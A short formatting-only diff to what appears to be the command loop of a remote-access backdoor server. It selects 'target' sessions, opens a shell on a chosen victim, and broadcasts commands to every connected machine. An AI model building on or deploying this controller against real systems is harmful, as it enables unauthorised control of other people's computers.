@@ -65,12 +65,12 @@ while True:
             num = int(command[8:])
             target_socket = targets[num]
             target_ip = ips[num]
-            utils.start_shell(target_socket,target_ip)
+            utils.start_shell(target_socket, target_ip)
         except Exception as e:
             print("Invalid session number!")
-    if command [:7] == "sendall":
+    if command[:7] == "sendall":
         targets_len = len(targets)
-        for i in range(0,targets_len):
+        for i in range(0, targets_len):
             target_socket = targets[i]
             target_ip = ips[i]
             utils.reliable_send(target_socket, command)
@@ -84,4 +84,3 @@ while True:
         stop_threads = True
         t1.join()
         break
-
